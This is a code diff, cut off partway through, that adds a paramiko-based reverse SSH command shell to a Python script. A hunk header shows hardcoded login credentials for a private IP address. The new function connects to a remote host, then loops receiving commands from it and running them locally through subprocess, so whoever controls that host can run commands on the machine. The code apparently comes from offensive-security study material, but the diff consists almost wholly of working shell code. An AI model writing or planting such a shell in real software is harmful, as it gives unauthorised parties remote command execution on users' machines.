@@ -18,4 +18,14 @@ ssh_command('192.168.100.131','justin','lovepython','id')
 def ssh_command_reverse(ip,user,passw,command):
     client=paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
+    client.connect(ip,username=user,password=passw)
+    ssh_session=client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command.encode())
+        print(ssh_session.recv(1024))
+        while True:
+            command=ssh_session.recv(1024).decode()
+            if command.lower()=="exit":
+                break
+            try:
+                output=subprocess.check_
